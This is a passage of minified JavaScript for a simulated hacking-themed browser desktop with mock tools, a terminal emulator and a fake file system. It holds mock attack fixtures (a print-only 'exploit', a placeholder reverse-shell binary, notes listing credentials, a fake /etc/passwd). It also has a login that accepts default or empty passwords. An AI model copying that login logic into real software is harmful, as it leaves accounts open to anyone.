      `);s.scrollTop=s.scrollHeight},650)}const ls={APP_DEFS:ae,buildTerminalHTML:ie,buildNmapHTML:le,buildHashCrackerHTML:re,buildSQLMapHTML:ce,buildMetasploitHTML:de,buildWiresharkHTML:pe,getPacketInfo:z,buildAircrackHTML:ue,generateFakeNetworks:Y,buildBurpSuiteHTML:me,buildHydraHTML:ve,buildJohnHTML:fe,buildBrowserHTML:be,buildTextEditorHTML:he,buildSettingsHTML:ye,buildSysInfoHTML:ge,buildWhoisHTML:$e,buildDNSHTML:xe,buildTracerouteHTML:Se,buildSubdomainsHTML:Te,buildNiktoHTML:ke,buildOpenVASHTML:Ee,buildWPScanHTML:Ce,buildXSSHTML:we,buildDirbHTML:Me,buildWordlistHTML:Pe,buildWifiAnalyzerHTML:Ae,buildKismetHTML:Le,buildSETHTML:He,buildShellgenHTML:Be,buildArpSpoofHTML:_e,buildSSLStripHTML:De,buildBinwalkHTML:Fe,buildAutopsyHTML:Oe,buildStegHideHTML:Re,buildFileManagerHTML:Ne,buildSimpleTool:w,selectHashType:Ue,selectMSFModule:We,msfCommand:qe,simulateMSFCommand:Z,appendMSFOut:B,runMSF:Ve,msfCheck:ze,runNmap:je,identifyHash:Ge,runHashCracker:Ke,runSQLMap:Je,runHydra:Xe,runJohn:Ye,johnShow:Ze,runAircrack:Ie,enableMonitor:et,applyWsFilter:tt,startCapture:st,stopCapture:ot,toggleProxy:nt,switchBurpTab:at,switchSettings:rt,setAccentColor:ct,toggleTransparency:dt,browserNav:pt,browserGo:ut,browserSearch:mt,browserLoad:I,fmNav:ft,fmGoTo:G,fmOpen:bt,fmNew:ht,editorNew:yt,editorSave:gt,editorOpen:$t,updateEditorLines:K,syncEditorScroll:xt,stopTool:St,clearOutput:Tt,runSimple:M,runWhois:kt,runDNS:Et,runTraceroute:Ct,runSubdomains:wt,runNikto:Mt,runOpenVAS:Pt,runWPScan:At,runXSSHunter:Lt,runDirb:Ht,runWordlist:Bt,runWifiAnalyzer:_t,runKismet:Dt,runSET:Ft,runShellgen:Ot,runArpSpoof:Rt,runSSLStrip:Nt,runBinwalk:Ut,runAutopsy:Wt,runSteghide:qt,buildMCPHubHTML:Vt,buildAICopilotHTML:as,switchMCPTab:Qt,toggleMCPServer:Jt,pingMCPServer:Xt,refreshMCPServers:Yt,onMCPToolChange:ee,resetMCPToolParams:Zt,invokeMCPTool:It,generateMCPServerScaffold:es,previewScaffoldCode:ts,copyClaudeConfig:ss,saveClaudeConfigToVFS:os,clearMCPLogs:ns,addMCPLog:N,useCopilotPrompt:is,sendCopilotMsg:te,generateHash:Qe,inspectPacket:vt,sendBurpRepeater:it,burpDecodeAction:lt,refreshFMGrid:F,md5:j,shaHash:D};typeof window<"u"&&Object.assign(window,ls);const x={windows:{},zIndex:100,activeWin:null,termHistory:{},termHistoryIdx:{},termTabs:{},bootTime:Date.now(),wallpapers:["linear-gradient(135deg, #0a0a1a 0%, #0d1030 50%, #0a0a1a 100%)","radial-gradient(ellipse at 20% 50%, #1a0030 0%, #0a0010 60%, #000 100%)","linear-gradient(135deg, #001a0a 0%, #0a2010 50%, #001510 100%)","radial-gradient(ellipse at center, #001a3a 0%, #000 70%)","linear-gradient(135deg, #1a0a00 0%, #2a1000 50%, #0a0500 100%)"],currentWallpaper:0};(function(){const t=localStorage.getItem("buildu_theme")||"cyberpunk";document.body.dataset.theme=t;const s=document.getElementById("matrix-canvas");J(s);const o=["[    0.000000] BuildU 1.0 (Linux BUILD-U-5.15.0-pentest-x86_64)","[    0.000042] Command line: BOOT_IMAGE=/vmlinuz root=/dev/sda1 quiet splash","[    0.124532] BIOS-provided physical RAM map: 32768MB available","[    0.241234] tsc: Detected 3600.012 MHz processor (24 cores)","[    0.356721] RCU: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=24","[    0.487932] Loading initial ramdisk and cryptographic modules...","[    0.601234] ACPI: RSDP 0x00000000000F0490 000024 (v02 BOCHS)","[    0.734521] Starting udev kernel device manager... [  OK  ]","[    0.891234] Loading BuildU hardware-accelerated security drivers...","[    1.023456] Mounting virtual file system (VFS)... [  OK  ]","[    1.156789] Initializing network interfaces (eth0, wlan0)... [  OK  ]","[    1.312345] Starting OpenSSH 8.9p1 daemon... [  OK  ]","[    1.445678] Loading penetration testing suites & signatures... [  OK  ]","[    1.589012] Starting Metasploit Framework RPC daemon...","[    1.734523] Loading Nmap 7.94 service detection signatures... [  OK  ]","[    1.867890] Initializing WebCrypto acceleration for hash cracking...","[    2.023456] Loading 603 cyber security tools... [  OK  ]","[    2.178901] Starting BuildU Glass Desktop Environment...","[    2.312345] BuildU OS ready. Welcome root."],n=document.getElementById("boot-log"),a=document.getElementById("boot-progress");let i=0;const l=setInterval(()=>{i<o.length?(n.textContent+=o[i]+`
`,n.scrollTop=n.scrollHeight,a.style.width=`${Math.floor((i+1)/o.length*100)}%`,i++):(clearInterval(l),setTimeout(()=>{document.getElementById("boot-screen").style.opacity="0",document.getElementById("boot-screen").style.transition="opacity 0.7s",setTimeout(()=>{document.getElementById("boot-screen").style.display="none",document.getElementById("login-screen").style.display="flex",J(document.getElementById("login-canvas")),document.getElementById("login-pass").focus()},700)},600))},95)})();function J(e){if(!e)return;const t=e.getContext("2d");e.width=window.innerWidth,e.height=window.innerHeight;const s="アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789ABCDEF!@#$%^&*()",o=12,n=Math.floor(e.width/o),a=Array(n).fill(1),i=["#00f5ff","#00ff88","#a855f7","#38bdf8"];setInterval(()=>{t.fillStyle="rgba(0,0,0,0.06)",t.fillRect(0,0,e.width,e.height),a.forEach((l,r)=>{t.font=`${o}px monospace`,t.fillStyle=i[Math.floor(Math.random()*i.length)],t.fillText(s[Math.floor(Math.random()*s.length)],r*o,l*o),l*o>e.height&&Math.random()>.975&&(a[r]=0),a[r]++})},45)}window.doLogin=function(){const e=document.getElementById("login-user").value,t=document.getElementById("login-pass").value;if(e==="root"&&t==="toor"||e==="admin"&&t==="admin"||t==="")typeof playAudio=="function"&&playAudio("login"),document.getElementById("login-screen").style.opacity="0",document.getElementById("login-screen").style.transition="opacity 0.6s",setTimeout(()=>{document.getElementById("login-screen").style.display="none",rs(),typeof showToast=="function"&&showToast("Access Granted","Welcome to BuildU Security OS","success","🛡️")},600);else{typeof playAudio=="function"&&playAudio("error");const s=document.getElementById("login-btn");s.textContent="Invalid credentials!",s.style.borderColor="#ef4444",s.style.color="#ef4444",setTimeout(()=>{s.textContent="LOGIN →",s.style.borderColor="",s.style.color=""},2e3)}};var X;(X=document.getElementById("login-pass"))==null||X.addEventListener("keydown",e=>{e.key==="Enter"&&doLogin()});function rs(){const e=document.getElementById("desktop");e.style.display="block",e.style.opacity="0",e.style.transition="opacity 0.5s",setTimeout(()=>e.style.opacity="1",50),se(x.currentWallpaper),cs(),setTimeout(()=>openApp("terminal"),800)}function se(e){const t=document.getElementById("desktop");t.style.background=x.wallpapers[e]}function cs(){const e=()=>{const t=new Date,s=document.getElementById("tray-time");s&&(s.textContent=t.toLocaleTimeString("en-US",{hour:"2-digit",minute:"2-digit",second:"2-digit",hour12:!1}))};e(),setInterval(e,1e3)}window.toggleAppMenu=function(){const e=document.getElementById("app-menu");e.style.display=e.style.display==="none"?"block":"none"};window.filterApps=function(){const e=document.getElementById("app-search").value.toLowerCase();document.querySelectorAll(".app-item").forEach(t=>{t.style.display=t.textContent.toLowerCase().includes(e)?"":"none"}),document.querySelectorAll(".app-category").forEach(t=>{const s=[...t.querySelectorAll(".app-item")].some(o=>o.style.display!=="none");t.querySelector(".category-title").style.display=s?"":"none"})};document.addEventListener("click",e=>{!e.target.closest("#app-menu")&&!e.target.closest("#app-menu-btn")&&(document.getElementById("app-menu").style.display="none"),e.target.closest("#context-menu")||(document.getElementById("context-menu").style.display="none")});window.openApp=function(e){document.getElementById("app-menu").style.display="none";const t=APP_DEFS[e];if(!t)return;const s=`${e}-${Date.now()}`,o=ds(s,t.title,t.icon,t.w,t.h);x.windows[s]={appId:e,el:o},document.getElementById("windows-container").appendChild(o),R(s),us(s,t.icon+" "+t.title),o.classList.add("animate-in"),ps(e,s)};function ds(e,t,s,o,n,a){const i=window.innerWidth-60,l=window.innerHeight-80;o=Math.min(o,i),n=Math.min(n,l);const r=60+Object.keys(x.windows).length%8*24,b=40+Object.keys(x.windows).length%6*24,h=document.createElement("div");return h.className="window focused",h.id=`win-${e}`,h.style.cssText=`left:${r}px;top:${b}px;width:${o}px;height:${n}px;z-index:${++x.zIndex}`,h.innerHTML=`
    <div class="window-titlebar" id="tb-${e}">
      <div class="win-controls">
        <div class="win-btn close" onclick="closeWindow('${e}')"></div>
        <div class="win-btn minimize" onclick="minimizeWindow('${e}')"></div>
        <div class="win-btn maximize" onclick="maximizeWindow('${e}')"></div>
      </div>
      <div class="win-icon">${s}</div>
      <div class="win-title">${t}</div>
    </div>
    <div class="window-body" id="wb-${e}"></div>
    <div class="window-resize" id="resize-${e}"></div>`,h.addEventListener("mousedown",()=>R(e)),ms(h,(document.getElementById,h),e),vs(h,e),h}function ps(e,t){const s=document.getElementById(`wb-${t}`);if(!s)return;const o={terminal:buildTerminalHTML,filemanager:buildFileManagerHTML,nmap:buildNmapHTML,hashcracker:buildHashCrackerHTML,sqlmap:buildSQLMapHTML,metasploit:buildMetasploitHTML,wireshark:buildWiresharkHTML,aircrack:buildAircrackHTML,burpsuite:buildBurpSuiteHTML,hydra:buildHydraHTML,john:buildJohnHTML,browser:buildBrowserHTML,texteditor:buildTextEditorHTML,settings:buildSettingsHTML,sysinfo:buildSysInfoHTML,whois:buildWhoisHTML,dnslookup:buildDNSHTML,traceroute:buildTracerouteHTML,subdomains:buildSubdomainsHTML,nikto:buildNiktoHTML,openvas:buildOpenVASHTML,wpscan:buildWPScanHTML,xsshunter:buildXSSHTML,dirb:buildDirbHTML,wordlist:buildWordlistHTML,wifianalyzer:buildWifiAnalyzerHTML,kismet:buildKismetHTML,setoolkit:buildSETHTML,shellgen:buildShellgenHTML,arpspoof:buildArpSpoofHTML,sslstrip:buildSSLStripHTML,binwalk:buildBinwalkHTML,autopsy:buildAutopsyHTML,steghide:buildStegHideHTML,mcphub:buildMCPHubHTML,aicopilot:buildAICopilotHTML};o[e]&&(s.innerHTML=o[e](t),e==="terminal"&&fs(t),e==="sysinfo"&&ys(t))}function R(e){document.querySelectorAll(".window").forEach(o=>{o.classList.remove("focused"),o.style.zIndex=parseInt(o.style.zIndex)||x.zIndex-1}),document.querySelectorAll(".taskbar-win-btn").forEach(o=>o.classList.remove("active"));const t=document.getElementById(`win-${e}`);t&&(t.classList.add("focused"),t.style.zIndex=++x.zIndex);const s=document.getElementById(`tbtn-${e}`);s&&s.classList.add("active"),x.activeWin=e}window.closeWindow=function(e){const t=document.getElementById(`win-${e}`);t&&(t.style.opacity="0",t.style.transform="scale(0.95)",t.style.transition="all 0.2s",setTimeout(()=>t.remove(),200));const s=document.getElementById(`tbtn-${e}`);s&&s.remove(),delete x.windows[e],x.activeWin===e&&(x.activeWin=null)};window.minimizeWindow=function(e){const t=document.getElementById(`win-${e}`);t&&(t.style.transform="scale(0.1) translateY(500px)",t.style.opacity="0",t.style.transition="all 0.3s",setTimeout(()=>t.style.display="none",300));const s=document.getElementById(`tbtn-${e}`);s&&(s.classList.remove("active"),s.onclick=()=>oe(e))};function oe(e){const t=document.getElementById(`win-${e}`);t&&(t.style.display="flex",setTimeout(()=>{t.style.transform="",t.style.opacity="1",t.style.transition="all 0.3s"},10)),R(e);const s=document.getElementById(`tbtn-${e}`);s&&(s.onclick=()=>R(e))}let U={};window.maximizeWindow=function(e){const t=document.getElementById(`win-${e}`);if(t)if(U[e]){const s=U[e];t.style.left=s.left,t.style.top=s.top,t.style.width=s.width,t.style.height=s.height,t.style.transition="all 0.2s",delete U[e]}else U[e]={left:t.style.left,top:t.style.top,width:t.style.width,height:t.style.height},t.style.transition="all 0.2s",t.style.left="0",t.style.top="0",t.style.width="100vw",t.style.height="calc(100vh - var(--taskbar-h))"};function us(e,t){const s=document.getElementById("taskbar-windows"),o=document.createElement("div");o.className="taskbar-win-btn active",o.id=`tbtn-${e}`,o.textContent=t.substring(0,20),o.title=t,o.onclick=()=>{const n=document.getElementById(`win-${e}`);n&&n.style.display==="none"?oe(e):R(e)},s.appendChild(o)}function ms(e,t,s){setTimeout(()=>{const o=document.getElementById(`tb-${s}`);if(!o)return;let n,a,i,l,r=!1;o.addEventListener("mousedown",b=>{b.target.closest(".win-controls")||(r=!0,n=b.clientX,a=b.clientY,i=parseInt(e.style.left)||0,l=parseInt(e.style.top)||0,e.style.transition="none",b.preventDefault())}),document.addEventListener("mousemove",b=>{if(!r)return;const h=i+(b.clientX-n),T=Math.max(0,l+(b.clientY-a));e.style.left=h+"px",e.style.top=T+"px"}),document.addEventListener("mouseup",()=>{r=!1})},10)}function vs(e,t){setTimeout(()=>{const s=document.getElementById(`resize-${t}`);if(!s)return;let o,n,a,i,l=!1;s.addEventListener("mousedown",r=>{l=!0,o=r.clientX,n=r.clientY,a=parseInt(e.style.width)||600,i=parseInt(e.style.height)||400,e.style.transition="none",r.preventDefault(),r.stopPropagation()}),document.addEventListener("mousemove",r=>{if(!l)return;const b=Math.max(300,a+(r.clientX-o)),h=Math.max(200,i+(r.clientY-n));e.style.width=b+"px",e.style.height=h+"px"}),document.addEventListener("mouseup",()=>{l=!1})},10)}document.getElementById("desktop").addEventListener("contextmenu",e=>{if(e.target.closest(".window")||e.target.closest("#taskbar"))return;e.preventDefault();const t=document.getElementById("context-menu");t.style.display="block",t.style.left=e.clientX+"px",t.style.top=Math.min(e.clientY,window.innerHeight-t.offsetHeight-40)+"px"});let H=null,_=.75;window.setAudioVolume=function(e){_=e/100;const t=document.getElementById("cc-vol-val");t&&(t.textContent=`${e}%`)};window.playAudio=function(e){if(!(_<=0))try{H||(H=new(window.AudioContext||window.webkitAudioContext)),H.state==="suspended"&&H.resume();const t=H.createOscillator(),s=H.createGain();t.connect(s),s.connect(H.destination);const o=H.currentTime;e==="click"?(t.frequency.setValueAtTime(800,o),t.frequency.exponentialRampToValueAtTime(400,o+.05),s.gain.setValueAtTime(.06*_,o),s.gain.linearRampToValueAtTime(.001,o+.05),t.start(o),t.stop(o+.05)):e==="login"||e==="success"?(t.frequency.setValueAtTime(523.25,o),t.frequency.setValueAtTime(659.25,o+.08),t.frequency.setValueAtTime(783.99,o+.16),s.gain.setValueAtTime(.08*_,o),s.gain.linearRampToValueAtTime(.001,o+.28),t.start(o),t.stop(o+.28)):e==="error"||e==="alert"?(t.type="sawtooth",t.frequency.setValueAtTime(260,o),t.frequency.setValueAtTime(180,o+.1),s.gain.setValueAtTime(.1*_,o),s.gain.linearRampToValueAtTime(.001,o+.25),t.start(o),t.stop(o+.25)):(t.frequency.setValueAtTime(600,o),s.gain.setValueAtTime(.05*_,o),s.gain.linearRampToValueAtTime(.001,o+.07),t.start(o),t.stop(o+.07))}catch{}};window.showToast=function(e,t,s="info",o="⚡"){const n=document.getElementById("toast-container");if(!n)return;const a=document.createElement("div");a.className=`toast ${s}`,a.innerHTML=`
    <div class="toast-icon">${o}</div>
    <div class="toast-content">
      <div class="toast-title">${e}</div>
      <div class="toast-msg">${t}</div>
    </div>
  `,n.appendChild(a),playAudio(s==="error"?"alert":"click"),setTimeout(()=>{a.style.animation="toastOut 0.25s forwards",setTimeout(()=>a.remove(),250)},4e3)};const O=["cyberpunk","kali-red","matrix","midnight-blue","stealth-oled"];window.toggleControlCenter=function(){const e=document.getElementById("control-center");e&&(e.style.display=e.style.display==="none"?"block":"none",playAudio("click"))};window.setTheme=function(e,t){if(document.body.dataset.theme=e,localStorage.setItem("buildu_theme",e),document.querySelectorAll(".cc-theme-btn").forEach(s=>s.classList.remove("active")),t)t.classList.add("active");else{const s=document.querySelector(`.cc-theme-btn[data-theme="${e}"]`);s&&s.classList.add("active")}showToast("Theme Changed",`Switched visual style to ${e.toUpperCase()}`,"info","🎨")};window.toggleThemeQuick=function(){const e=document.body.dataset.theme||"cyberpunk",t=O.indexOf(e),s=O[(t+1)%O.length];setTheme(s)};window.lockScreen=function(){const e=document.getElementById("desktop"),t=document.getElementById("login-screen"),s=document.getElementById("control-center");if(s&&(s.style.display="none"),e&&(e.style.display="none"),t){t.style.display="flex",t.style.opacity="1";const o=document.getElementById("login-pass");o&&(o.value="",o.focus())}showToast("System Locked","Session credentials locked for root@buildu","warn","🔒")};const A={files:{"/root/flag.txt":"CTF{BUILDU_ELITE_PRODUCTION_PENTESTER_2026}","/root/exploit.py":`#!/usr/bin/env python3
# BuildU Zero-Day Exploitation PoC
import socket, sys
target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.105"
print(f"[*] Attacking target: {target}:80...")
print("[+] Memory corrupted, injecting shellcode...")
print("[+] Payload delivered! Spawned root shell on port 4444.")`,"/root/targets.txt":`192.168.1.1
192.168.1.105
10.10.10.24
scanme.buildu.org`,"/root/notes.md":`# BuildU Pentest Engagement Notes
- Discovered open port 21 (vsftpd 2.3.4 backdoor)
- Database MySQL port 3306 credentials: root:toor
- SSH keys dumped in /root/.ssh/
- Secret API keys found in /var/www/config.php`,"/root/.bashrc":`export PATH=$PATH:/usr/local/sbin
alias ll="ls -la"
alias scan="nmap -sV -sC"
alias update="apt update"`,"/etc/passwd":`root:x:0:0:root:/root:/bin/bash
buildu:x:1000:1000:BuildU User:/home/buildu:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`,"/etc/hosts":`127.0.0.1	localhost
127.0.1.1	buildu
192.168.1.1	gateway.corp
10.10.10.24	target.box`,"/etc/hostname":"buildu","/usr/share/wordlists/rockyou.txt":`password
123456
12345678
qwerty
admin123
roottoor
letmein
welcome
superman
buildu2026`,"/tmp/payload.elf":"ELF\0[BuildU Reverse Shell Binary 64-bit]","/root/mcp-hub/README.md":`# MCP Hub - Model Context Protocol Framework
Framework for creating and managing Model Context Protocol (MCP) servers and clients using uv.
Run: mcp status or openApp("mcphub")`,"/root/mcp-hub/claude_desktop_config.json":`{
  "mcpServers": {
    "buildu-security": {
      "command": "python3",
      "args": ["/root/mcp-hub/servers/buildu-security-mcp.py"]
    },
    "mcp-server-rag": {
      "command": "python3",
      "args": ["/root/mcp-hub/llm/mcp_server_rag.py"]
    }
  }
}`,"/root/mcp-hub/create_mcp_server.py":`#!/usr/bin/env python3
# MCP Server Template Generator
# Generates Model Context Protocol servers using uv and FastMCP
import os, sys
print("[+] BuildU MCP Server Generator armed and ready.")`,"/root/mcp-hub/servers/buildu-security-mcp.py":`#!/usr/bin/env python3
# BuildU Security MCP Server
from mcp.server.fastmcp import FastMCP
mcp = FastMCP("buildu-security-mcp")
@mcp.tool()
def nmap_scan(target: str): return f"Scanned {target}"
if __name__ == "__main__": mcp.run()`,"/root/mcp-hub/llm/mcp_server_rag.py":`#!/usr/bin/env python3
# RAG Intelligence Engine
from fastapi import FastAPI
app = FastAPI(title="BuildU RAG MCP")
print("[+] ChromaDB RAG Vector Store connected.")`},dirs:new Set(["/","/root","/root/Desktop","/root/Documents","/root/Downloads","/root/tools","/root/wordlists","/root/mcp-hub","/root/mcp-hub/servers","/root/mcp-hub/mcp-servers","/root/mcp-hub/llm","/root/.config","/root/.config/claude","/home","/home/buildu","/etc","/var","/var/log","/var/www","/usr","/usr/share","/usr/share/wordlists","/tmp","/opt"]),resolve(e,t="/root"){if(!e)return t;if(e==="~"||e==="~/")return"/root";e.startsWith("~/")&&(e="/root"+e.slice(1));const o=(e.startsWith("/")?e:t==="/"?"/"+e:t+"/"+e).split("/").filter(a=>a&&a!=="."),n=[];for(const a of o)a===".."?n.pop():n.push(a);return"/"+n.join("/")},list(e){const t=this.resolve(e),s=[];return this.dirs.forEach(o=>{if(o!==t&&o.startsWith(t==="/"?"/":t+"/")){const n=o.slice(t==="/"?1:t.length+1).split("/")[0];n&&!s.some(a=>a.name===n)&&s.push({name:n,isDir:!0,icon:"📁",path:t==="/"?"/"+n:t+"/"+n})}}),Object.keys(this.files).forEach(o=>{if((o.substring(0,o.lastIndexOf("/"))||"/")===t){const a=o.substring(o.lastIndexOf("/")+1),i=a.endsWith(".py")?"🐍":a.endsWith(".sh")?"📜":a.endsWith(".txt")?"📄":a.endsWith(".md")?"📝":a.endsWith(".elf")?"⚙️":"📄";s.push({name:a,isDir:!1,icon:i,path:o,size:this.files[o].length})}}),s},read(e,t="/root"){const s=this.resolve(e,t);return this.files[s]!==void 0?this.files[s]:null},write(e,t,s="/root"){const o=this.resolve(e,s),n=o.substring(0,o.lastIndexOf("/"))||"/";return this.dirs.add(n),this.files[o]=t,window.dispatchEvent(new CustomEvent("vfs-change",{detail:{path:o}})),!0},delete(e,t="/root"){const s=this.resolve(e,t);let o=!1;return this.files[s]!==void 0&&(delete this.files[s],o=!0),this.dirs.has(s)&&(this.dirs.delete(s),o=!0),window.dispatchEvent(new CustomEvent("vfs-change",{detail:{path:s}})),o},mkdir(e,t="/root"){const s=this.resolve(e,t);return this.dirs.add(s),window.dispatchEvent(new CustomEvent("vfs-change",{detail:{path:s}})),!0}};window.VFS=A;function fs(e){x.termHistory[e]=[],x.termHistoryIdx[e]=-1,x.termTabs[e]={tabs:["bash 1"],activeTab:0,cwd:["/root"]};const t=document.getElementById(`to-0-${e}`);c(t,'<span class="success" style="font-weight:700">⚡ BuildU OS 1.0 (Rolling Release) - High Security Console</span>'),c(t,`<span class="out" style="color:var(--text-secondary)">BuildU Linux root@buildu [${new Date().toLocaleString()}]</span>`),c(t,`<span class="out" style="color:var(--text-dim)">Type 'help', 'neofetch', or 'buildu' for available tools.</span>`),c(t,""),setTimeout(()=>{var s;return(s=document.getElementById(`ti-${e}`))==null?void 0:s.focus()},100)}function c(e,t){if(!e)return;const s=document.createElement("div");s.className="line",s.innerHTML=t,e.appendChild(s),e.scrollTop=e.scrollHeight}window.termKeyDown=function(e,t){const s=document.getElementById(`ti-${t}`);if(!s)return;const o=x.termTabs[t],n=(o==null?void 0:o.activeTab)??0,a=document.getElementById(`to-${n}-${t}`),i=(o==null?void 0:o.cwd[n])??"/root";if(e.key==="Enter"){const l=s.value.trim();s.value="",l&&(x.termHistory[t].unshift(l),x.termHistoryIdx[t]=-1),c(a,`<span class="prompt">┌──(root㉿buildu)-[${i}]<br>└─# </span><span class="cmd">${q(l)}</span>`),l&&bs(l,a,t,n)}else if(e.key==="ArrowUp"){const l=x.termHistory[t];x.termHistoryIdx[t]=Math.min(x.termHistoryIdx[t]+1,l.length-1),s.value=l[x.termHistoryIdx[t]]||""}else if(e.key==="ArrowDown")x.termHistoryIdx[t]=Math.max(x.termHistoryIdx[t]-1,-1),s.value=x.termHistory[t][x.termHistoryIdx[t]]||"";else if(e.key==="Tab"){e.preventDefault();const l=s.value.split(" ").pop(),r=["mcp","mcp-hub","copilot","ai","uv","nmap","sqlmap","hydra","john","aircrack-ng","metasploit","msfconsole","nikto","gobuster","wfuzz","curl","wget","python3","bash","ssh","ftp","nc","netcat","ls","cd","cat","touch","mkdir","rm","nano","edit","echo","neofetch","buildu","theme","notify","grep","find","chmod","chown","ps","kill","ifconfig","ip","ping","traceroute","whois","dig","nslookup","dirb","wpscan","burpsuite","steghide","binwalk","autopsy"],b=A.list(i).map(T=>T.name),h=[...r,...b].find(T=>T.startsWith(l));if(h){const T=s.value.split(" ");T[T.length-1]=h,s.value=T.join(" ")}}};function bs(e,t,s,o){var b,h,T,L,f;if(e.includes(" > ")||e.includes(" >> ")){const p=e.includes(" >> "),[u,v]=e.split(p?" >> ":" > "),m=v.trim(),d=x.termTabs[s],g=(d==null?void 0:d.cwd[o])??"/root";let $=u.trim();$.toLowerCase().startsWith("echo ")&&($=$.substring(5).replace(/^['"]|['"]$/g,""));const k=p&&A.read(m,g)||"";A.write(m,(k?k+`
`:"")+$,g),c(t,`<span class="success">Wrote to ${m}</span>`);return}const n=e.trim().split(/\s+/),a=n[0].toLowerCase(),i=n.slice(1),l=x.termTabs[s],r=(l==null?void 0:l.cwd[o])??"/root";switch(a){case"help":c(t,'<span class="info" style="font-weight:700">⚡ BuildU Core Commands:</span>'),[["neofetch","Display BuildU system telemetry & ASCII banner"],["buildu","Open BuildU command-line dashboard"],["mcp [status|list|gui]","Model Context Protocol server manager & tools"],["copilot [prompt]","Autonomous AI cybersecurity pentest agent"],["uv run <script>","Fast Python package & script runner (mcp-hub)"],["theme <name>","Switch theme (cyberpunk, kali-red, matrix, midnight-blue, stealth-oled)"],["notify <text>","Send desktop notification toast"],["ls, ll, dir","List files & directories in current directory"],["cd <path>","Change directory (supports .., ~, /)"],["cat <file>","Read file contents from VFS"],["touch <file>","Create a new file in VFS"],["mkdir <dir>","Create a new directory in VFS"],["rm <file>","Delete a file or directory from VFS"],["nano, edit <file>","Open file in BuildU Text Editor"],["echo <text> > <file>","Write text to a file"],["pwd","Print current working directory"],["whoami, id","Print current user and privilege status"],["uname -a","Display BuildU kernel information"],["ifconfig, ip a","List network adapters and IP addresses"],["ping <host>","Send live ICMP echo requests"],["ps, netstat","List processes and network sockets"],["nmap <target>","Scan target IP or hostname for open ports"],["sqlmap, msfconsole","Launch web attack and exploit suites"],["john, hydra","Execute password cracking engines"],["clear","Clear console buffer"],["exit","Close current terminal session"]].forEach(([y,S])=>c(t,`  <span class="success">${y.padEnd(26)}</span><span class="out">${S}</span>`));break;case"neofetch":c(t,`
<div style="display:flex;gap:20px;margin:8px 0;align-items:center">
  <pre style="color:var(--accent-cyan);font-weight:700;line-height:1.2;font-size:0.75rem">
  ██████╗ ██╗   ██╗██╗██╗     ██████╗ ██╗   ██╗
  ██╔══██╗██║   ██║██║██║     ██╔══██╗██║   ██║
  ██████╔╝██║   ██║██║██║     ██║  ██║██║   ██║
  ██╔══██╗██║   ██║██║██║     ██║  ██║██║   ██║
  ██████╔╝╚██████╔╝██║███████╗██████╔╝╚██████╔╝
  ╚═════╝  ╚═════╝ ╚═╝╚══════╝╚═════╝  ╚═════╝ </pre>
  <div style="font-size:0.78rem;line-height:1.6">
    <span style="color:var(--accent-cyan);font-weight:700">root@buildu</span><br>
    -------------------------<br>
    <span style="color:var(--accent-cyan)">OS:</span> BuildU Linux 1.0 x86_64 (Rolling)<br>
    <span style="color:var(--accent-cyan)">Host:</span> BuildU Security Station Pro<br>
    <span style="color:var(--accent-cyan)">Kernel:</span> 5.15.0-buildu-pentest-x86_64<br>
    <span style="color:var(--accent-cyan)">Uptime:</span> 4 hours, 18 mins<br>
    <span style="color:var(--accent-cyan)">Packages:</span> 603 (buildu-sec)<br>
    <span style="color:var(--accent-cyan)">Shell:</span> bash 5.2.15<br>
    <span style="color:var(--accent-cyan)">DE:</span> BuildU Glass UI (Hardware Accelerated)<br>
    <span style="color:var(--accent-cyan)">Theme:</span> ${document.body.dataset.theme||"cyberpunk"}<br>
    <span style="color:var(--accent-cyan)">CPU:</span> AMD Ryzen 9 7950X (32) @ 4.500GHz<br>
    <span style="color:var(--accent-cyan)">Memory:</span> 4280MiB / 32150MiB (13%)
  </div>
</div>`);break;case"buildu":c(t,'<span class="info" style="font-weight:700">⚡ BuildU Cybersecurity OS Dashboard</span>'),c(t,'<span class="out">Architecture: x86_64 | Hostname: buildu | Status: ARMED & ACTIVE</span>'),c(t,'<span class="success">[+] 33 Security Tool Suites Installed and Operational</span>'),c(t,'<span class="success">[+] Stateful VFS mounted at / (in-memory persistent)</span>'),c(t,`<span class="info">Quick launch: 'nmap 127.0.0.1', 'neofetch', 'theme kali-red'</span>`);break;case"mcp":case"mcp-hub":const p=(b=i[0])==null?void 0:b.toLowerCase();p==="gui"?(openApp("mcphub"),c(t,'<span class="success">Opened MCP Hub Manager window.</span>')):p==="list"||p==="tools"?(c(t,'<span class="info" style="font-weight:700">⚡ Registered Model Context Protocol (MCP) Tools:</span>'),(((h=window.MCP_STATE)==null?void 0:h.tools)||[]).forEach(S=>{c(t,`  <span style="color:var(--accent-cyan);font-weight:600">${S.name.padEnd(28)}</span> <span class="out">${S.desc}</span>`)})):p==="servers"?(c(t,'<span class="info" style="font-weight:700">⚡ Active MCP Servers:</span>'),(((T=window.MCP_STATE)==null?void 0:T.servers)||[]).forEach(S=>{const C=S.status==="online"?"var(--accent-green)":"var(--accent-orange)";c(t,`  <span style="color:${C}">[${S.status.toUpperCase()}]</span> <span style="font-weight:600">${S.name}</span> (${S.transport}, Port: ${S.port})`)})):(c(t,'<span class="info" style="font-weight:700">⚡ Model Context Protocol (MCP) Runtime v1.6.0</span>'),c(t,'<span class="out">Framework: mcp-hub (Astral uv + FastMCP Python integration)</span>'),c(t,'<span class="success">[+] 5 MCP Servers Configured (buildu-security-mcp, mcp-server-rag, cve-analyzer, weather, github)</span>'),c(t,'<span class="success">[+] JSON-RPC 2.0 Transport Bridge Listening on 127.0.0.1:8765</span>'),c(t,'<span class="out">Commands:</span>'),c(t,'  <span class="success">mcp status</span>     <span class="out">Show connection status & registered endpoints</span>'),c(t,'  <span class="success">mcp list</span>       <span class="out">List all tools & JSON-RPC signatures</span>'),c(t,'  <span class="success">mcp servers</span>    <span class="out">Display all MCP servers and transports</span>'),c(t,'  <span class="success">mcp gui</span>        <span class="out">Open graphical MCP Hub in BuildU Desktop</span>'));break;case"copilot":case"ai":if(i.length>0){const y=i.join(" ");c(t,`<span class="info">🤖 AI Copilot (MCP Agent): Planning execution for "${q(y)}"...</span>`),setTimeout(()=>{c(t,'<span class="success">[+] Selected MCP Tool: buildu.nmap_scan</span>'),c(t,'<span class="out">Target reconnaissance complete. 3 services detected. Launching Copilot window...</span>'),openApp("aicopilot"),setTimeout(()=>{const S=document.querySelector('[id^="copilot-input-"]');S&&(S.value=y,sendCopilotMsg(S.id.replace("copilot-input-","")))},300)},400)}else 